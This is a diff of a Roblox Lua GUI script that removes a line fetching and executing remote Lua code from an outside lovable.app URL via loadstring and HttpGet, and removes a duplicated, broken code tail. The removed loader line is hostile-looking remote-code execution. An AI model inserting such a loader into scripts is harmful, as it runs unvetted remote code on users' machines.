@@ -31,7 +31,7 @@ local function addPrintedBranding(parent, position, size, textSize)
     label.ZIndex = 999
     return label
 end
-loadstring(game:HttpGet("https://generator-crash.lovable.app/s/miguelzini377-svg/loader.lua?p=lkingbeats"))()
+
 do
     local ReplicatedStorage
     do
@@ -14828,16 +14828,6 @@ do
             if main then
                 if main.Visible then
                     hideGui()
-                else
-                    showGui()
-                end
-            end
-            return
-        end
-    end)
-end
-return
-ideGui()
                 else
                     showGui()
                 end
